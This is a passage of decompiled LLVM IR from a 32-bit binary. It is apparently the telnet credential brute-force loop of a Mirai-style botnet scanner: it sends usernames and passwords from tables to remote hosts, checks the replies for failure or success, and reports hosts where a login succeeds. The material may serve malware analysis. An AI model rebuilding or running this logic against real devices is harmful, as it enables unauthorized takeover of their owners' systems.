  %v5_804acc1 = load i8, i8* %v4_804ac7f, align 2
  %v6_804acc1 = zext i8 %v5_804acc1 to i32
  store i32 %v6_804acc1, i32* %eax.global-to-local, align 4
  %v1_804acc9 = mul nuw nsw i32 %v6_804acc1, 4
  %v2_804acc9 = add nuw nsw i32 %v1_804acc9, 134578400
  %v3_804acc9 = inttoptr i32 %v2_804acc9 to i32*
  %v4_804acc9 = load i32, i32* %v3_804acc9, align 4
  store i32 %v4_804acc9, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804ace6 = inttoptr i32 %v2_804a49f to i32*
  %v4_804ace6 = load i32, i32* %v3_804ace6, align 4
  store i32 %v4_804ace6, i32* %eax.global-to-local, align 4
  %v0_804ace9 = load i32, i32* @esp, align 4
  %v1_804ace9 = add i32 %v0_804ace9, 12
  %v2_804ace9 = inttoptr i32 %v1_804ace9 to i32*
  store i32 16384, i32* %v2_804ace9, align 4
  %v0_804acf1 = load i32, i32* @esi, align 4
  %v1_804acf1 = load i32, i32* @esp, align 4
  %v2_804acf1 = add i32 %v1_804acf1, 8
  %v3_804acf1 = inttoptr i32 %v2_804acf1 to i32*
  store i32 %v0_804acf1, i32* %v3_804acf1, align 4
  %v0_804acf5 = load i32, i32* @ebx, align 4
  %v1_804acf5 = load i32, i32* @esp, align 4
  %v2_804acf5 = add i32 %v1_804acf5, 4
  %v3_804acf5 = inttoptr i32 %v2_804acf5 to i32*
  store i32 %v0_804acf5, i32* %v3_804acf5, align 4
  %v0_804acf9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804acf9 = load i32, i32* @esp, align 4
  %v2_804acf9 = inttoptr i32 %v1_804acf9 to i32*
  store i32 %v0_804acf9, i32* %v2_804acf9, align 4
  %v4_804acfc = call i32 @__libc_send(i32 %v4_804ac87, i32 %v2_804a3a8, i32 %v6_804a4ed, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804acfc, i32* %eax.global-to-local, align 4
  %v2_804ad01 = icmp slt i32 %v4_804acfc, 0
  %v1_804ad03 = icmp eq i1 %v2_804ad01, false
  store i32 %v1_804a48f, i32* @edx, align 4
  br i1 %v1_804ad03, label %dec_label_pc_804ad2b, label %dec_label_pc_804ad05

dec_label_pc_804ad05:                             ; preds = %dec_label_pc_804ac69
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804ad1e = load i32, i32* @esp, align 4
  %v2_804ad1e = inttoptr i32 %v1_804ad1e to i32*
  store i32 %v2_804a49f, i32* %v2_804ad1e, align 4
  %v1_804ad21 = call i32 @reset_telstate(i32 %v4_804ac87)
  store i32 %v1_804ad21, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804ad2b:                             ; preds = %dec_label_pc_804ac69
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804ad41 = load i32, i32* %v3_804ace6, align 4
  store i32 %v4_804ad41, i32* %eax.global-to-local, align 4
  %v0_804ad44 = load i32, i32* @esp, align 4
  %v1_804ad44 = add i32 %v0_804ad44, 12
  %v2_804ad44 = inttoptr i32 %v1_804ad44 to i32*
  store i32 16384, i32* %v2_804ad44, align 4
  %v0_804ad4c = load i32, i32* @esp, align 4
  %v1_804ad4c = add i32 %v0_804ad4c, 8
  %v2_804ad4c = inttoptr i32 %v1_804ad4c to i32*
  store i32 2, i32* %v2_804ad4c, align 4
  %v0_804ad54 = load i32, i32* @esp, align 4
  %v1_804ad54 = add i32 %v0_804ad54, 4
  %v2_804ad54 = inttoptr i32 %v1_804ad54 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055d13.56 to i32), i32* %v2_804ad54, align 4
  %v0_804ad5c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad5c = load i32, i32* @esp, align 4
  %v2_804ad5c = inttoptr i32 %v1_804ad5c to i32*
  store i32 %v0_804ad5c, i32* %v2_804ad5c, align 4
  %v4_804ad5f = call i32 @__libc_send(i32 %v4_804ac87, i32 %v2_804a3a8, i32 %v6_804a4ed, i32 ptrtoint (i32* @0 to i32))
  %v2_804ad64 = icmp slt i32 %v4_804ad5f, 0
  %v1_804ad66 = icmp eq i1 %v2_804ad64, false
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804ada7 = load i32, i32* @esp, align 4
  br i1 %v1_804ad66, label %dec_label_pc_804ad8e, label %dec_label_pc_804ad68

dec_label_pc_804ad68:                             ; preds = %dec_label_pc_804ad2b
  %v2_804ad81 = inttoptr i32 %v0_804ada7 to i32*
  store i32 %v2_804a49f, i32* %v2_804ad81, align 4
  %v1_804ad84 = call i32 @reset_telstate(i32 %v4_804ac87)
  store i32 %v1_804ad84, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804ad8e:                             ; preds = %dec_label_pc_804ad2b
  %v1_804ada7 = add i32 %v0_804ada7, 4
  %v2_804ada7 = inttoptr i32 %v1_804ada7 to i32*
  store i32 4, i32* %v2_804ada7, align 4
  %v0_804adaf = load i32, i32* %eax.global-to-local, align 4
  %v1_804adaf = load i32, i32* @esp, align 4
  %v2_804adaf = inttoptr i32 %v1_804adaf to i32*
  store i32 %v0_804adaf, i32* %v2_804adaf, align 4
  %v2_804adb2 = inttoptr i32 %v4_804ac87 to i32*
  %v3_804adb2 = call i32 @advance_state(i32* %v2_804adb2, i32 %v2_804a3a8)
  store i32 %v3_804adb2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804adbc:                             ; preds = %dec_label_pc_804a4d7
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  %v1_804add4 = add i32 %v2_804a49f, 24
  store i32 %v1_804add4, i32* %eax.global-to-local, align 4
  %v1_804add7 = inttoptr i32 %v1_804add4 to i32*
  %v2_804add7 = load i32, i32* %v1_804add7, align 4
  store i32 %v2_804add7, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804adef = inttoptr i32 %v2_804a49f to i32*
  %v4_804adef = load i32, i32* %v3_804adef, align 4
  store i32 %v4_804adef, i32* %edx.global-to-local, align 4
  %v0_804adf2 = load i32, i32* @esp, align 4
  %v1_804adf2 = add i32 %v0_804adf2, 16
  %v2_804adf2 = inttoptr i32 %v1_804adf2 to i32*
  store i32 ptrtoint (i32* @global_var_805818c to i32), i32* %v2_804adf2, align 4
  %v0_804adfa = load i32, i32* @esp, align 4
  %v1_804adfa = add i32 %v0_804adfa, 12
  %v2_804adfa = inttoptr i32 %v1_804adfa to i32*
  store i32 1024, i32* %v2_804adfa, align 4
  %v0_804ae02 = load i32, i32* @ebx, align 4
  %v1_804ae02 = load i32, i32* @esp, align 4
  %v2_804ae02 = add i32 %v1_804ae02, 8
  %v3_804ae02 = inttoptr i32 %v2_804ae02 to i32*
  store i32 %v0_804ae02, i32* %v3_804ae02, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804ae09 = load i32, i32* @esp, align 4
  %v2_804ae09 = add i32 %v1_804ae09, 4
  %v3_804ae09 = inttoptr i32 %v2_804ae09 to i32*
  store i32 %arg1, i32* %v3_804ae09, align 4
  %v0_804ae0d = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae0d = load i32, i32* @esp, align 4
  %v2_804ae0d = inttoptr i32 %v1_804ae0d to i32*
  store i32 %v0_804ae0d, i32* %v2_804ae0d, align 4
  %v1_804ae10 = call i32 @read_until_response(i32 %v6_804a4ed)
  %v1_804ae15 = icmp eq i32 %v1_804ae10, 0
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  br i1 %v1_804ae15, label %dec_label_pc_804aea2, label %dec_label_pc_804ae1d

dec_label_pc_804ae1d:                             ; preds = %dec_label_pc_804adbc
  store i32 %v1_804add4, i32* %eax.global-to-local, align 4
  %v2_804ae38 = load i32, i32* %v1_804add7, align 4
  store i32 %v2_804ae38, i32* %eax.global-to-local, align 4
  %v1_804ae3a = load i32, i32* @esp, align 4
  %v2_804ae3a = inttoptr i32 %v1_804ae3a to i32*
  store i32 %v2_804ae38, i32* %v2_804ae3a, align 4
  %v1_804ae3d = call i32 @contains_fail(i32 %stack_var_-624.247)
  %v1_804ae42 = icmp eq i32 %v1_804ae3d, 0
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804ae8d = load i32, i32* @esp, align 4
  %v1_804ae8d = add i32 %v0_804ae8d, 4
  %v2_804ae8d = inttoptr i32 %v1_804ae8d to i32*
  br i1 %v1_804ae42, label %dec_label_pc_804ae74, label %dec_label_pc_804ae46

dec_label_pc_804ae46:                             ; preds = %dec_label_pc_804ae1d
  store i32 0, i32* %v2_804ae8d, align 4
  %v0_804ae67 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae67 = load i32, i32* @esp, align 4
  %v2_804ae67 = inttoptr i32 %v1_804ae67 to i32*
  store i32 %v0_804ae67, i32* %v2_804ae67, align 4
  %v2_804ae6a = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804ae6a = call i32 @advance_state(i32* %v2_804ae6a, i32 %v2_804a3a8)
  store i32 %v3_804ae6a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804ae74:                             ; preds = %dec_label_pc_804ae1d
  store i32 5, i32* %v2_804ae8d, align 4
  %v0_804ae95 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae95 = load i32, i32* @esp, align 4
  %v2_804ae95 = inttoptr i32 %v1_804ae95 to i32*
  store i32 %v0_804ae95, i32* %v2_804ae95, align 4
  %v2_804ae98 = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804ae98 = call i32 @advance_state(i32* %v2_804ae98, i32 %v2_804a3a8)
  store i32 %v3_804ae98, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804aea2:                             ; preds = %dec_label_pc_804adbc
  store i32 %v1_804a4a1, i32* %eax.global-to-local, align 4
  %v2_804aebd = load i32, i32* %v1_804a4a4, align 4
  store i32 %v2_804aebd, i32* %eax.global-to-local, align 4
  %v1_804aebf = add i32 %v2_804aebd, 3
  store i32 %v1_804aebf, i32* @ebx, align 4
  %v0_804aec2 = load i32, i32* @esp, align 4
  %v1_804aec2 = inttoptr i32 %v0_804aec2 to i32*
  store i32 0, i32* %v1_804aec2, align 4
  %v1_804aec9 = inttoptr i32 %stack_var_-624.247 to i32*
  %v2_804aec9 = call i32 @__GI_time(i32* %v1_804aec9)
  store i32 %v2_804aec9, i32* %eax.global-to-local, align 4
  %v0_804aece = load i32, i32* @ebx, align 4
  %v7_804aece = icmp ult i32 %v0_804aece, %v2_804aec9
  %v1_804aed0 = icmp eq i1 %v7_804aece, false
  br i1 %v1_804aed0, label %dec_label_pc_804b459, label %dec_label_pc_804aed6

dec_label_pc_804aed6:                             ; preds = %dec_label_pc_804aea2
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804aeef = load i32, i32* @esp, align 4
  %v2_804aeef = inttoptr i32 %v1_804aeef to i32*
  store i32 %v2_804a49f, i32* %v2_804aeef, align 4
  %v1_804aef2 = call i32 @reset_telstate(i32 %stack_var_-624.247)
  store i32 %v1_804aef2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804aefc:                             ; preds = %dec_label_pc_804a4d7
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804af12 = add i32 %v2_804a61e, %v2_804a49d
  %v4_804af12 = inttoptr i32 %v3_804af12 to i8*
  %v5_804af12 = load i8, i8* %v4_804af12, align 1
  %v6_804af12 = zext i8 %v5_804af12 to i32
  store i32 %v6_804af12, i32* %eax.global-to-local, align 4
  %v1_804af1a = mul nuw nsw i32 %v6_804af12, 4
  %v2_804af1a = add nuw nsw i32 %v1_804af1a, 134578464
  %v3_804af1a = inttoptr i32 %v2_804af1a to i32*
  %v4_804af1a = load i32, i32* %v3_804af1a, align 4
  %v1_804af2c = and i32 %v4_804af1a, -256
  store i32 %v1_804af2c, i32* %eax.global-to-local, align 4
  %v4_804af2f = inttoptr i32 %v4_804af1a to i8*
  store i32 %v4_804af1a, i32* @edi, align 4
  %v3_804af35 = call i32 @_strlen(i8* %v4_804af2f)
  store i32 %v3_804af35, i32* @esi, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v5_804af54 = load i8, i8* %v4_804af12, align 1
  %v6_804af54 = zext i8 %v5_804af54 to i32
  store i32 %v6_804af54, i32* %eax.global-to-local, align 4
  %v1_804af5c = mul nuw nsw i32 %v6_804af54, 4
  %v2_804af5c = add nuw nsw i32 %v1_804af5c, 134578464
  %v3_804af5c = inttoptr i32 %v2_804af5c to i32*
  %v4_804af5c = load i32, i32* %v3_804af5c, align 4
  store i32 %v4_804af5c, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804af79 = inttoptr i32 %v2_804a49f to i32*
  %v4_804af79 = load i32, i32* %v3_804af79, align 4
  store i32 %v4_804af79, i32* %eax.global-to-local, align 4
  %v0_804af7c = load i32, i32* @esp, align 4
  %v1_804af7c = add i32 %v0_804af7c, 12
  %v2_804af7c = inttoptr i32 %v1_804af7c to i32*
  store i32 16384, i32* %v2_804af7c, align 4
  %v0_804af84 = load i32, i32* @esi, align 4
  %v1_804af84 = load i32, i32* @esp, align 4
  %v2_804af84 = add i32 %v1_804af84, 8
  %v3_804af84 = inttoptr i32 %v2_804af84 to i32*
  store i32 %v0_804af84, i32* %v3_804af84, align 4
  %v0_804af88 = load i32, i32* @ebx, align 4
  %v1_804af88 = load i32, i32* @esp, align 4
  %v2_804af88 = add i32 %v1_804af88, 4
  %v3_804af88 = inttoptr i32 %v2_804af88 to i32*
  store i32 %v0_804af88, i32* %v3_804af88, align 4
  %v0_804af8c = load i32, i32* %eax.global-to-local, align 4
  %v1_804af8c = load i32, i32* @esp, align 4
  %v2_804af8c = inttoptr i32 %v1_804af8c to i32*
  store i32 %v0_804af8c, i32* %v2_804af8c, align 4
  %v4_804af8f = call i32 @__libc_send(i32 %v4_804af1a, i32 %stack_var_-624.247, i32 %v2_804a3a8, i32 %v6_804a4ed)
  store i32 %v4_804af8f, i32* %eax.global-to-local, align 4
  %v2_804af94 = icmp slt i32 %v4_804af8f, 0
  %v1_804af96 = icmp eq i1 %v2_804af94, false
  store i32 %v1_804a48f, i32* @edx, align 4
  br i1 %v1_804af96, label %dec_label_pc_804afbe, label %dec_label_pc_804af98

dec_label_pc_804af98:                             ; preds = %dec_label_pc_804aefc
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804afb1 = load i32, i32* @esp, align 4
  %v2_804afb1 = inttoptr i32 %v1_804afb1 to i32*
  store i32 %v2_804a49f, i32* %v2_804afb1, align 4
  %v1_804afb4 = call i32 @reset_telstate(i32 %v4_804af1a)
  store i32 %v1_804afb4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804afbe:                             ; preds = %dec_label_pc_804aefc
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804afd4 = load i32, i32* %v3_804af79, align 4
  store i32 %v4_804afd4, i32* %eax.global-to-local, align 4
  %v0_804afd7 = load i32, i32* @esp, align 4
  %v1_804afd7 = add i32 %v0_804afd7, 12
  %v2_804afd7 = inttoptr i32 %v1_804afd7 to i32*
  store i32 16384, i32* %v2_804afd7, align 4
  %v0_804afdf = load i32, i32* @esp, align 4
  %v1_804afdf = add i32 %v0_804afdf, 8
  %v2_804afdf = inttoptr i32 %v1_804afdf to i32*
  store i32 2, i32* %v2_804afdf, align 4
  %v0_804afe7 = load i32, i32* @esp, align 4
  %v1_804afe7 = add i32 %v0_804afe7, 4
  %v2_804afe7 = inttoptr i32 %v1_804afe7 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055d13.56 to i32), i32* %v2_804afe7, align 4
  %v0_804afef = load i32, i32* %eax.global-to-local, align 4
  %v1_804afef = load i32, i32* @esp, align 4
  %v2_804afef = inttoptr i32 %v1_804afef to i32*
  store i32 %v0_804afef, i32* %v2_804afef, align 4
  %v4_804aff2 = call i32 @__libc_send(i32 %v4_804af1a, i32 %stack_var_-624.247, i32 %v2_804a3a8, i32 %v6_804a4ed)
  %v2_804aff7 = icmp slt i32 %v4_804aff2, 0
  %v1_804aff9 = icmp eq i1 %v2_804aff7, false
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804b03a = load i32, i32* @esp, align 4
  br i1 %v1_804aff9, label %dec_label_pc_804b021, label %dec_label_pc_804affb

dec_label_pc_804affb:                             ; preds = %dec_label_pc_804afbe
  %v2_804b014 = inttoptr i32 %v0_804b03a to i32*
  store i32 %v2_804a49f, i32* %v2_804b014, align 4
  %v1_804b017 = call i32 @reset_telstate(i32 %v4_804af1a)
  store i32 %v1_804b017, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b021:                             ; preds = %dec_label_pc_804afbe
  %v1_804b03a = add i32 %v0_804b03a, 4
  %v2_804b03a = inttoptr i32 %v1_804b03a to i32*
  store i32 6, i32* %v2_804b03a, align 4
  %v0_804b042 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b042 = load i32, i32* @esp, align 4
  %v2_804b042 = inttoptr i32 %v1_804b042 to i32*
  store i32 %v0_804b042, i32* %v2_804b042, align 4
  %v2_804b045 = inttoptr i32 %v4_804af1a to i32*
  %v3_804b045 = call i32 @advance_state(i32* %v2_804b045, i32 %stack_var_-624.247)
  store i32 %v3_804b045, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b04f:                             ; preds = %dec_label_pc_804a4d7
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  %v1_804b067 = add i32 %v2_804a49f, 24
  store i32 %v1_804b067, i32* %eax.global-to-local, align 4
  %v1_804b06a = inttoptr i32 %v1_804b067 to i32*
  %v2_804b06a = load i32, i32* %v1_804b06a, align 4
  store i32 %v2_804b06a, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804b082 = inttoptr i32 %v2_804a49f to i32*
  %v4_804b082 = load i32, i32* %v3_804b082, align 4
  store i32 %v4_804b082, i32* %edx.global-to-local, align 4
  %v0_804b085 = load i32, i32* @esp, align 4
  %v1_804b085 = add i32 %v0_804b085, 16
  %v2_804b085 = inttoptr i32 %v1_804b085 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_80581e0.57 to i32), i32* %v2_804b085, align 4
  %v0_804b08d = load i32, i32* @esp, align 4
  %v1_804b08d = add i32 %v0_804b08d, 12
  %v2_804b08d = inttoptr i32 %v1_804b08d to i32*
  store i32 1024, i32* %v2_804b08d, align 4
  %v0_804b095 = load i32, i32* @ebx, align 4
  %v1_804b095 = load i32, i32* @esp, align 4
  %v2_804b095 = add i32 %v1_804b095, 8
  %v3_804b095 = inttoptr i32 %v2_804b095 to i32*
  store i32 %v0_804b095, i32* %v3_804b095, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804b09c = load i32, i32* @esp, align 4
  %v2_804b09c = add i32 %v1_804b09c, 4
  %v3_804b09c = inttoptr i32 %v2_804b09c to i32*
  store i32 %arg1, i32* %v3_804b09c, align 4
  %v0_804b0a0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b0a0 = load i32, i32* @esp, align 4
  %v2_804b0a0 = inttoptr i32 %v1_804b0a0 to i32*
  store i32 %v0_804b0a0, i32* %v2_804b0a0, align 4
  %v1_804b0a3 = call i32 @read_until_response(i32 %v6_804a4ed)
  store i32 %v1_804b0a3, i32* %eax.global-to-local, align 4
  %v1_804b0a8 = icmp eq i32 %v1_804b0a3, 0
  br i1 %v1_804b0a8, label %dec_label_pc_804b28f, label %dec_label_pc_804b0b0

dec_label_pc_804b0b0:                             ; preds = %dec_label_pc_804b04f
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804b0b3 = load i32, i32* @esp, align 4
  %v1_804b0b3 = inttoptr i32 %v0_804b0b3 to i32*
  store i32 0, i32* %v1_804b0b3, align 4
  %v1_804b0ba = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804b0ba = call i32 @__GI_time(i32* %v1_804b0ba)
  store i32 %v2_804b0ba, i32* @esi, align 4
  %v0_804b0c4 = load i32, i32* @ebx, align 4
  %v2_804b0d4 = mul i32 %v0_804b0c4, 28
  %v1_804b0d8 = add i32 %v2_804b0d6, %v2_804b0d4
  %v2_804b0db = inttoptr i32 %v1_804b0d8 to i32*
  store i32 %v2_804b0ba, i32* %v2_804b0db, align 4
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v1_804b067, i32* %eax.global-to-local, align 4
  %v2_804b0f8 = load i32, i32* %v1_804b06a, align 4
  store i32 %v2_804b0f8, i32* %eax.global-to-local, align 4
  %v1_804b0fa = load i32, i32* @esp, align 4
  %v2_804b0fa = inttoptr i32 %v1_804b0fa to i32*
  store i32 %v2_804b0f8, i32* %v2_804b0fa, align 4
  %v1_804b0fd = call i32 @contains_fail(i32 %stack_var_-628.248)
  store i32 %v1_804b0fd, i32* %eax.global-to-local, align 4
  %v1_804b102 = icmp eq i32 %v1_804b0fd, 0
  store i32 %v1_804a48f, i32* @edx, align 4
  br i1 %v1_804b102, label %dec_label_pc_804b134, label %dec_label_pc_804b106

dec_label_pc_804b106:                             ; preds = %dec_label_pc_804b0b0
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804b11f = load i32, i32* @esp, align 4
  %v1_804b11f = add i32 %v0_804b11f, 4
  %v2_804b11f = inttoptr i32 %v1_804b11f to i32*
  store i32 0, i32* %v2_804b11f, align 4
  %v0_804b127 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b127 = load i32, i32* @esp, align 4
  %v2_804b127 = inttoptr i32 %v1_804b127 to i32*
  store i32 %v0_804b127, i32* %v2_804b127, align 4
  %v3_804b12a = call i32 @advance_state(i32* %v1_804b0ba, i32 %stack_var_-624.247)
  store i32 %v3_804b12a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b134:                             ; preds = %dec_label_pc_804b0b0
  store i32 %v1_804b067, i32* %eax.global-to-local, align 4
  %v2_804b14f = load i32, i32* %v1_804b06a, align 4
  store i32 %v2_804b14f, i32* %eax.global-to-local, align 4
  %v1_804b151 = load i32, i32* @esp, align 4
  %v2_804b151 = inttoptr i32 %v1_804b151 to i32*
  store i32 %v2_804b14f, i32* %v2_804b151, align 4
  %v1_804b154 = call i32 @contains_success(i32 %stack_var_-628.248)
  store i32 %v1_804b154, i32* %eax.global-to-local, align 4
  %v1_804b159 = icmp eq i32 %v1_804b154, 0
  store i32 %v1_804a48f, i32* @edx, align 4
  br i1 %v1_804b159, label %dec_label_pc_804b269, label %dec_label_pc_804b161

dec_label_pc_804b161:                             ; preds = %dec_label_pc_804b134
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804b177 = add i32 %v2_804a52d, %v2_804a49d
  %v4_804b177 = inttoptr i32 %v3_804b177 to i8*
  %v5_804b177 = load i8, i8* %v4_804b177, align 1
  %v6_804b177 = zext i8 %v5_804b177 to i32
  store i32 %v6_804b177, i32* %eax.global-to-local, align 4
  %v10_804b17c = icmp eq i8 %v5_804b177, 2
  %v1_804b17e = icmp eq i1 %v10_804b17c, false
  store i32 %v1_804a48f, i32* @edx, align 4
  br i1 %v1_804b17e, label %dec_label_pc_804b1ae, label %dec_label_pc_804b180

dec_label_pc_804b180:                             ; preds = %dec_label_pc_804b161
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804b199 = load i32, i32* @esp, align 4
  %v1_804b199 = add i32 %v0_804b199, 4
  %v2_804b199 = inttoptr i32 %v1_804b199 to i32*
  store i32 7, i32* %v2_804b199, align 4
  %v0_804b1a1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b1a1 = load i32, i32* @esp, align 4
  %v2_804b1a1 = inttoptr i32 %v1_804b1a1 to i32*
  store i32 %v0_804b1a1, i32* %v2_804b1a1, align 4
  %v3_804b1a4 = call i32 @advance_state(i32* %v1_804b0ba, i32 %stack_var_-624.247)
  store i32 %v3_804b1a4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b1ae:                             ; preds = %dec_label_pc_804b161
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804b1c4 = add i32 %v2_804a61e, %v2_804a49d
  %v4_804b1c4 = inttoptr i32 %v3_804b1c4 to i8*
  %v5_804b1c4 = load i8, i8* %v4_804b1c4, align 1
  %v6_804b1c4 = zext i8 %v5_804b1c4 to i32
  store i32 %v6_804b1c4, i32* %eax.global-to-local, align 4
  %v1_804b1cc = mul nuw nsw i32 %v6_804b1c4, 4
  %v2_804b1cc = add nuw nsw i32 %v1_804b1cc, 134578464
  %v3_804b1cc = inttoptr i32 %v2_804b1cc to i32*
  %v4_804b1cc = load i32, i32* %v3_804b1cc, align 4
  store i32 %v4_804b1cc, i32* @ebx, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804b1e9 = add i32 %v2_804a665, %v2_804a49d
  %v4_804b1e9 = inttoptr i32 %v3_804b1e9 to i8*
  %v5_804b1e9 = load i8, i8* %v4_804b1e9, align 2
  %v6_804b1e9 = zext i8 %v5_804b1e9 to i32
  store i32 %v6_804b1e9, i32* %eax.global-to-local, align 4
  %v1_804b1f1 = mul nuw nsw i32 %v6_804b1e9, 4
  %v2_804b1f1 = add nuw nsw i32 %v1_804b1f1, 134578400
  %v3_804b1f1 = inttoptr i32 %v2_804b1f1 to i32*
  %v4_804b1f1 = load i32, i32* %v3_804b1f1, align 4
  store i32 %v4_804b1f1, i32* @esi, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804b211 = load i32, i32* @esp, align 4
  %v2_804b211 = inttoptr i32 %v1_804b211 to i32*
  store i32 %v2_804a49f, i32* %v2_804b211, align 4
  %v0_804b214 = call i32 @get_telstate_host()
  store i32 %v0_804b214, i32* %eax.global-to-local, align 4
  %v0_804b219 = load i32, i32* @global_var_80584c0.18, align 64
  store i32 %v0_804b219, i32* %edx.global-to-local, align 4
  %v0_804b21f = load i32, i32* @ebx, align 4
  %v1_804b21f = load i32, i32* @esp, align 4
  %v2_804b21f = add i32 %v1_804b21f, 16
  %v3_804b21f = inttoptr i32 %v2_804b21f to i32*
  store i32 %v0_804b21f, i32* %v3_804b21f, align 4
  %v0_804b223 = load i32, i32* @esi, align 4
  %v1_804b223 = load i32, i32* @esp, align 4
  %v2_804b223 = add i32 %v1_804b223, 12
  %v3_804b223 = inttoptr i32 %v2_804b223 to i32*
  store i32 %v0_804b223, i32* %v3_804b223, align 4
  %v1_804b227 = load i32, i32* @esp, align 4
  %v2_804b227 = add i32 %v1_804b227, 8
  %v3_804b227 = inttoptr i32 %v2_804b227 to i32*
  store i32 %v0_804b214, i32* %v3_804b227, align 4
  %v0_804b22b = load i32, i32* @esp, align 4
  %v1_804b22b = add i32 %v0_804b22b, 4
  %v2_804b22b = inttoptr i32 %v1_804b22b to i32*
  store i32 ptrtoint (i32* @global_var_8055d18.58 to i32), i32* %v2_804b22b, align 4
  %v0_804b233 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b233 = load i32, i32* @esp, align 4
  %v2_804b233 = inttoptr i32 %v1_804b233 to i32*
  store i32 %v0_804b233, i32* %v2_804b233, align 4
  %v4_804b236 = call i32 @Rootsprintf(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3a8, i32 %v6_804a4ed)
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v0_804b254 = load i32, i32* @esp, align 4
  %v1_804b254 = add i32 %v0_804b254, 4
  %v2_804b254 = inttoptr i32 %v1_804b254 to i32*
  store i32 7, i32* %v2_804b254, align 4
  %v0_804b25c = load i32, i32* %eax.global-to-local, align 4
  %v1_804b25c = load i32, i32* @esp, align 4
  %v2_804b25c = inttoptr i32 %v1_804b25c to i32*
  store i32 %v0_804b25c, i32* %v2_804b25c, align 4
  %v3_804b25f = call i32 @advance_state(i32* %v1_804b0ba, i32 %stack_var_-624.247)
  store i32 %v3_804b25f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b269:                             ; preds = %dec_label_pc_804b134
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804b282 = load i32, i32* @esp, align 4
  %v2_804b282 = inttoptr i32 %v1_804b282 to i32*
  store i32 %v2_804a49f, i32* %v2_804b282, align 4
  %v1_804b285 = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804b285, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b28f:                             ; preds = %dec_label_pc_804b04f
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
